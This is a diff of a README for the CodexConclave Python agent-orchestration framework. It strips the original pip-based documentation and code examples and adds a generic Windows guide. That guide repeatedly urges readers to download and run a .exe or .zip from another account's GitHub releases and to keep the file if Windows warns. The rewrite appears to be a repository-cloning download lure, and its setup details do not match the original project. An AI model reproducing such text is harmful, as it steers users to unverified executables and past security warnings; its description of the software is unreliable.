@@ -1,365 +1,209 @@
-<p align="center"><img src="assets/banner.png" alt="CodexConclave"/></p>
+# 🤖 codexconclave - Run AI agent teams with ease
 
-<h1 align="center">CodexConclave</h1>
-<p align="center">A Python framework for building and orchestrating teams of autonomous AI agents</p>
+[![Download codexconclave](https://img.shields.io/badge/Download%20codexconclave-blue?style=for-the-badge&logo=github)](https://github.com/Hasyim12426/codexconclave/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/python-3.11+-blue" alt="Python 3.11+">
-  <img src="https://img.shields.io/badge/pydantic-v2-E92063" alt="Pydantic v2" />
-  <img src="https://img.shields.io/badge/litellm-powered-0066cc" alt="litellm" />
-  <img src="https://img.shields.io/badge/opentelemetry-instrumented-3d348b" alt="OpenTelemetry" />
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="MIT License" /></a>
-</p>
+## 🧩 What this app does
 
----
+codexconclave is a Python framework for running teams of AI agents. It helps one agent pass work to another, follow steps in order, and keep a task moving without much manual work.
 
-**Navigation**
+Use it when you want to:
 
-- [What it does](#what-it-does)
-- [Architecture](#architecture)
-- [Installation](#installation)
-- [Quick Start](#quick-start)
-- [CLI Reference](#cli-reference)
-- [Configuration](#configuration)
-- [Design Decisions](#design-decisions)
-- [Observability](#observability)
-- [Known Limitations](#known-limitations)
-- [Contributing](#contributing)
-- [License](#license)
+- break one big task into smaller parts
+- let agents work in a set flow
+- connect with AI models through LiteLLM
+- handle events and steps in a clear order
+- build multi-agent workflows that stay organized
 
----
+## 💻 What you need on Windows
 
-## What it does
+Before you start, make sure your PC has:
 
-CodexConclave gives you two distinct paradigms for building AI workflows:
+- Windows 10 or Windows 11
+- An internet connection
+- Enough free space for the app and its files
+- A modern web browser
+- Python 3.11 or later if the release you download needs it
 
-**Conclave** -- team of autonomous agents (Arbiters) collaborating on a list of work units (Directives). Each Arbiter has its own role, objective, and toolset. Arbiters reason iteratively using an LLM, call instruments (tools), delegate to peers, and chain their outputs into a final result. Use this when you want open-ended reasoning where the agents decide how to get the work done.
+If the release includes a ready-to-run Windows file, you can use that file without setting up a full dev tool chain.
 
-**Cascade** -- deterministic, decorator-driven pipeline where you control the execution graph. Methods decorated with `@initiate`, `@observe`, and `@route` wire themselves into a dependency graph that is walked at runtime. No LLM involvement in the orchestration itself -- pure Python with typed state flowing between stages. Use this when the shape of the workflow is known in advance.
+## 📥 Download the app
 
-Both models emit structured events through a shared Signal Bus, support pluggable memory backends, and integrate with any LLM provider that litellm supports.
+Visit the release page here:
 
----
+[Download codexconclave from GitHub Releases](https://github.com/Hasyim12426/codexconclave/releases)
 
-## Architecture
+On that page, look for the latest release. Then choose the Windows file or package that matches your system.
 
-<p align="center"><img src="assets/architecture.png" alt="CodexConclave Architecture" width="800" /></p>
+## 🪟 Install on Windows
 
-**Conclave path** -- User code assembles Arbiters and Directives into a Conclave, selects `sequential` or `hierarchical` protocol, and calls `.assemble()`. Each Directive is executed by its assigned Arbiter, which drives an iterative LLM loop: build messages, call the LLM Provider (backed by litellm), parse instrument calls or delegation requests, invoke the appropriate Instrument or peer Arbiter, append results to the message thread, and repeat until the Arbiter produces a final answer or exhausts its iteration budget.
+Follow the steps below:
 
-**Cascade path** -- User code subclasses `Cascade`, decorates methods, and calls `.execute()`. The framework introspects the class at definition time to build a dependency graph. At runtime it calls `@initiate` methods first, then fans out to `@observe` listeners, routing branches via `@route` return values.
+1. Open the release page.
+2. Find the latest version.
+3. Open the list of files for that release.
+4. Download the Windows file that fits your setup.
+5. If Windows asks for permission, choose to keep the file.
+6. When the download ends, open the file or unzip the folder if needed.
+7. If the app starts in a terminal window, keep that window open while you use it.
 
-**Supporting infrastructure** spans both paths: the LLM Provider abstracts provider-specific APIs behind a unified interface; Instruments are validated, cached, and use-limited tools that Arbiters can invoke; Chronicle stores and retrieves memories per Arbiter; the Signal Bus is a thread-safe singleton that any component can emit to and any listener can subscribe to.
+If the release gives you a `.exe` file, double-click it to run the app.
 
----
+If the release gives you a `.zip` file, right-click it and choose Extract All, then open the extracted folder and start the app file inside it.
 
-## Installation
+## 🛠️ First run
 
-```bash
-pip install codexconclave
-```
+The first time you start codexconclave, it may ask for:
 
-Optional extras:
+- an API key for your AI provider
+- a model name
+- a task or workflow file
+- a folder where it should save results
 
-```bash
-# Persistent vector memory with LanceDB and sentence-transformers
-pip install "codexconclave[memory]"
+Use the values from your own AI account and project setup.
 
-# Knowledge base support with ChromaDB and fastembed
-pip install "codexconclave[knowledge]"
+If the app opens in a terminal, you may need to type or paste the values there. If it opens a small window, use the fields on screen.
 
-# All optional dependencies
-pip install "codexconclave[all]"
+## ⚙️ Common setup values
 
-# Development tools (pytest, mypy, ruff, pre-commit)
-pip install "codexconclave[dev]"
-```
+You may see settings like these:
 
-At least one LLM provider API key must be set in the environment. See [Configuration](#configuration).
+- `OPENAI_API_KEY` for OpenAI models
+- `ANTHROPIC_API_KEY` for Anthropic models
+- `LITELLM_MODEL` for the model name
+- `WORKFLOW_PATH` for the workflow file
+- `OUTPUT_DIR` for saved files
 
----
+If you are not sure what to enter, start with the values that came with the release notes or sample files.
 
-## Quick Start
+## 🔄 How it works
 
-### Conclave -- agent team
+codexconclave follows a simple flow:
 
-```python
-from codexconclave import Arbiter, Conclave, Directive, Protocol
-from codexconclave.llm import LLMProvider
+1. One agent receives the task.
+2. The task gets split into smaller steps.
+3. Other agents handle each step.
+4. The framework passes results from one step to the next.
+5. The final output comes back in one place.
 
-llm = LLMProvider(model="gpt-4o")
+This setup helps keep complex work in order. It also makes it easier to trace what each agent did.
 
-researcher = Arbiter(
-    role="Researcher",
-    objective="Find accurate, up-to-date information on the given topic.",
-    llm=llm,
-)
+## 🧠 Typical uses
 
-writer = Arbiter(
-    role="Writer",
-    objective="Turn research notes into clear, engaging prose.",
-    llm=llm,
-)
-
-research = Directive(
-    description="Research the history of transformer neural networks.",
-    expected_output="Bullet-point notes covering key milestones and papers.",
-    arbiter=researcher,
-)
+You can use codexconclave for tasks like:
 
-article = Directive(
-    description="Write a short article based on the research notes.",
-    expected_output="A 300-word article suitable for a developer blog.",
-    arbiter=writer,
-    context=[research],       # automatically receives researcher output
-)
+- research flows
+- content drafting
+- support triage
+- data review
+- task routing
+- code-related agent chains
+- automated report steps
 
-conclave = Conclave(
-    arbiters=[researcher, writer],
-    directives=[research, article],
-    protocol=Protocol.sequential,
-)
-
-result = conclave.assemble()
-print(result.final_output)
-```
-
-### Cascade -- deterministic pipeline
-
-```python
-from codexconclave.cascade import Cascade, CascadeState, initiate, observe, route
-
-class AnalysisPipeline(Cascade):
-
-    @initiate
-    def load_data(self) -> str:
-        return "raw,csv,data"
+It fits jobs where one AI call is not enough and you need a set of linked actions.
 
-    @observe("load_data")
-    def clean(self, raw: str) -> str:
-        return raw.replace(",", " | ")
+## 📁 Project files you may see
 
-    @observe("clean")
-    def analyse(self, cleaned: str) -> dict:
-        words = cleaned.split(" | ")
-        return {"count": len(words), "sample": words[:2]}
+After you download and unzip the app, you may see files and folders like these:
 
-    @route
-    @observe("analyse")
-    def dispatch(self, report: dict) -> str:
-        return "summarise" if report["count"] > 1 else "skip"
-
-    @observe("dispatch")
-    def summarise(self, report: dict) -> str:
-        return f"Found {report['count']} items."
-
-pipeline = AnalysisPipeline()
-result = pipeline.execute()
-print(result.final_state)
-```
-
-### Custom instruments (tools)
-
-```python
-from codexconclave.instruments import StructuredInstrument
-
-def search_web(query: str) -> str:
-    # your implementation
-    return f"Results for: {query}"
-
-search = StructuredInstrument.from_function(
-    search_web,
-    name="search_web",
-    description="Search the web for current information.",
-)
-
-researcher = Arbiter(
-    role="Researcher",
-    objective="...",
-    llm=llm,
-    instruments=[search],
-)
-```
-
-### Event listeners
-
-```python
-from codexconclave.signals import SignalBus, BaseSignalListener
-from codexconclave.signals.types import DirectiveCompletedSignal
-
-class AuditLogger(BaseSignalListener):
-    def accepts(self, signal) -> bool:
-        return isinstance(signal, DirectiveCompletedSignal)
-
-    def handle(self, signal) -> None:
-        print(f"[AUDIT] directive done in {signal.execution_time_ms:.0f}ms")
+- `workflows/` for task flows
+- `agents/` for agent setup
+- `config/` for app settings
+- `examples/` for sample runs
+- `logs/` for run history
+- `output/` for saved results
 
-SignalBus.instance().register(AuditLogger())
-```
+You do not need to change all of these. Start with the sample files if the release includes them.
 
----
+## 🧪 Basic use flow
 
-## CLI Reference
+A common run looks like this:
 
-The `codex` command scaffolds and runs projects.
+1. Open the app.
+2. Load a sample workflow.
+3. Add your prompt or task.
+4. Pick the model you want to use.
+5. Run the workflow.
+6. Check the output folder or screen results.
 
-```
-Usage: codex [OPTIONS] COMMAND [ARGS]...
+If you want to test it first, use a short task such as a simple research or planning flow.
 
-Commands:
-  create conclave <name>   Scaffold a new Conclave agent-team project
-  create cascade  <name>   Scaffold a new Cascade pipeline project
-  run                      Execute the current project's main.py
-  chat <query>             Start an interactive chat session
-```
+## 🔐 API keys
 
-### Examples
+If your release uses hosted AI models, you need an API key. Keep the key private.
 
-```bash
-# Scaffold a new agent project
-codex create conclave my-research-team
-cd my-research-team
-# edit main.py, then:
-codex run
+Common places to enter it:
 
-# Scaffold a pipeline
-codex create cascade my-pipeline
-cd my-pipeline
-codex run
+- a `.env` file
+- a settings screen
+- a prompt in the terminal
 
-# One-shot chat
-codex chat "Summarise the key ideas in the attached document."
-```
+If you use a `.env` file, it may look like this:
 
----
+OPENAI_API_KEY=your_key_here  
+ANTHROPIC_API_KEY=your_key_here
 
-## Configuration
+Do not share this file with others.
 
-All configuration is via environment variables. A `.env` file in the working directory is loaded automatically.
+## 📌 Sample workflow idea
 
-### LLM provider keys
+Here is a simple example of how a workflow can work:
 
-| Variable | Provider |
-|---|---|
-| `OPENAI_API_KEY` | OpenAI |
-| `ANTHROPIC_API_KEY` | Anthropic Claude |
-| `GOOGLE_API_KEY` | Google Gemini |
-| `GROQ_API_KEY` | Groq |
-| `MISTRAL_API_KEY` | Mistral |
-| `AZURE_API_KEY` | Azure OpenAI |
-| `AZURE_API_BASE` | Azure endpoint URL |
-| `AZURE_API_VERSION` | Azure API version |
-| `AWS_ACCESS_KEY_ID` | AWS Bedrock |
-| `AWS_SECRET_ACCESS_KEY` | AWS Bedrock |
-| `AWS_DEFAULT_REGION` | AWS Bedrock region |
+- Agent 1 reads the task
+- Agent 2 gathers facts
+- Agent 3 checks the result
+- Agent 4 writes the final output
 
-### Framework settings
+This helps you separate jobs and keep each step focused.
 
-| Variable | Default | Description |
-|---|---|---|
-| `CODEX_LOG_LEVEL` | `INFO` | Log verbosity (`DEBUG`, `INFO`, `WARNING`, `ERROR`, `CRITICAL`) |
-| `CODEX_MEMORY_BACKEND` | `memory` | Memory store: `memory` (in-process) or `lancedb` (persistent) |
-| `CODEX_MEMORY_PATH` | | Path for LanceDB data directory |
-| `OTEL_SDK_DISABLED` | `false` | Set to `true` to disable telemetry |
-| `OTEL_SERVICE_NAME` | `codexconclave` | Service name in telemetry traces |
-| `OTEL_EXPORTER_OTLP_ENDPOINT` | | Custom OpenTelemetry collector endpoint |
+## 🧭 Troubleshooting
 
-### LLMProvider constructor
+If the app does not start:
 
-LLM settings can also be set per-provider instance:
+- check that the file finished downloading
+- make sure Windows did not block the file
+- run the app again from the same folder
+- confirm that Python is installed if the release needs it
+- check the release notes for extra setup steps
 
-```python
-LLMProvider(
-    model="claude-3-5-sonnet-20241022",  # exact litellm model identifier
-    temperature=0.7,
-    max_tokens=4096,
-    api_key="sk-...",        # overrides env var
-    base_url="http://...",   # custom endpoint (e.g. local Ollama)
-    timeout=600.0,
-    max_retries=3,
-    streaming=False,
-)
-```
+If the app opens but nothing happens:
 
-Model names must be exact litellm identifiers (e.g., `gpt-4o`, `claude-3-5-sonnet-20241022`, `gemini/gemini-1.5-pro`). See the [litellm documentation](https://docs.litellm.ai/docs/providers) for the full list.
+- check the terminal for messages
+- make sure your API key is set
+- confirm the model name is valid
+- try a sample workflow first
 
----
+If you get a file path error:
 
-## Design Decisions
+- move the app folder to a simple path like `C:\codexconclave`
+- avoid folders with long names or special characters
 
-**Introspection-based Cascade graph.** Cascade subclasses use `__init_subclass__` to inspect decorated methods at class definition time, building `_initiate_methods`, `_observe_map`, and `_route_methods` registries. This keeps the user API clean (decorators only) while making the dependency graph computable without a separate registration step.
+## 🔄 Updating the app
 
-**JSON parsing for Arbiter tool calls.** Arbiters detect instrument invocations by scanning LLM responses for `{"instrument": "name", "arguments": {...}}` JSON fragments, rather than relying on the provider's native function-calling API. This makes tool use work uniformly across all litellm-supported providers, including those without native tool schemas.
+When a new release comes out:
 
-**Stacked retry strategy.** Retries exist at two levels: `LLMProvider` retries individual API calls with exponential backoff; `Conclave` retries entire directive executions. This catches transient network failures at the call level and model-quality failures at the task level independently.
+1. Open the releases page.
+2. Download the newest version.
+3. Replace the old files with the new files if needed.
+4. Keep your workflow files and settings if they are separate from the app files.
 
-**Pydantic v2 throughout, with `arbitrary_types_allowed`.** All framework models use `ConfigDict(arbitrary_types_allowed=True)` to hold non-serializable fields (LLM provider instances, callables, Pydantic model classes) while still getting validation and IDE support on everything else.
+If the app stores settings in its own folder, back them up before you replace files.
 
-**ContextVar-backed SignalBus.** The SignalBus is a process-level singleton but uses `contextvars.ContextVar` to allow per-execution-context buses in concurrent or async scenarios. Listeners registered on the context bus only see signals from their own execution context.
+## 🧰 Best folder setup
 
----
+For a smooth run, keep the app in a simple folder such as:
 
-## Observability
+- `C:\codexconclave`
+- `C:\Apps\codexconclave`
 
-**Signal Bus** -- every major lifecycle event emits a typed, immutable Pydantic signal. All signals carry a UUID, ISO timestamp, and relevant metadata.
+This makes file paths easier to manage and cuts down on path errors.
 
-| Signal | Emitted when |
-|---|---|
-| `ConclaveStartedSignal` / `ConclaveCompletedSignal` / `ConclaveErrorSignal` | Conclave run begins, ends, or fails |
-| `DirectiveStartedSignal` / `DirectiveCompletedSignal` / `DirectiveErrorSignal` | Each directive begins, ends, or fails |
-| `ArbiterStartedSignal` / `ArbiterCompletedSignal` / `ArbiterErrorSignal` | Each Arbiter execution begins, ends, or fails |
-| `InstrumentUsedSignal` | An instrument is invoked |
-| `LLMCallSignal` | An LLM call completes (includes token counts and latency) |
-| `CascadeStartedSignal` / `CascadeCompletedSignal` | Cascade pipeline begins or ends |
+## 📦 Release page
 
-Subscribe by subclassing `BaseSignalListener` and registering it with `SignalBus.instance().register(listener)`.
+Use this page to get the latest Windows build:
 
-**OpenTelemetry** -- the framework ships an optional OTLP HTTP exporter. Set `OTEL_EXPORTER_OTLP_ENDPOINT` to your collector. Disable entirely with `OTEL_SDK_DISABLED=true`. Telemetry is anonymous and collects only aggregate usage metrics (model names, execution times, error rates).
+[https://github.com/Hasyim12426/codexconclave/releases](https://github.com/Hasyim12426/codexconclave/releases)
 
----
+## 📝 What to expect
 
-## Known Limitations
+codexconclave is built for agent orchestration. It focuses on task flow, model calls, and output handling. That makes it a good fit when you want AI steps to work as a team and not as one loose call
 
-**Async execution is partially implemented.** `Conclave.aassemble()` exists but runs the synchronous path inside `loop.run_in_executor()`. The `Directive.async_execution` flag is declared but has no effect. Cascade is fully synchronous. True parallel directive execution is not yet supported.
-
-**Knowledge sources are not wired.** `Conclave` accepts a `knowledge_sources` parameter, but the value is never used in the current execution path. It is a placeholder for a planned RAG integration.
-
-**Context growth is unbounded.** Directive outputs are concatenated into a running context string. There is no automatic summarisation or truncation. Long chains of directives will eventually hit the model's context window.
-
-**Instrument JSON parsing is fragile.** The Arbiter extracts tool calls by finding the first `{...}` block in the LLM response. If the response contains multiple JSON objects or nested braces that confuse the parser, the call will be silently treated as a final answer.
-
-**Default memory is in-process and non-persistent.** `InMemoryChronicleStore` (the default) is lost when the process exits and uses substring matching rather than semantic similarity. Install `codexconclave[memory]` and set `CODEX_MEMORY_BACKEND=lancedb` for production use.
-
-**Telemetry is on by default.** Anonymous usage telemetry is sent to `telemetry.codexconclave.ai` unless `OTEL_SDK_DISABLED=true` is set.
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide. Quick version:
-
-```bash
-# Clone and install dev dependencies
-git clone https://github.com/TemidireAdesiji/codexconclave
-cd codexconclave
-pip install -e ".[dev]"
-pre-commit install
-
-# Run the test suite
-pytest
-
-# Lint and format
-ruff check src tests
-ruff format src tests
-
-# Type-check
-mypy src
-```
-
-Tests live in `tests/unit/` and `tests/integration/`. The project uses `pytest-asyncio` with `asyncio_mode = auto` and `pytest-cov` for coverage reporting.
-
----
-
-## License
-
-MIT. See [LICENSE](LICENSE).
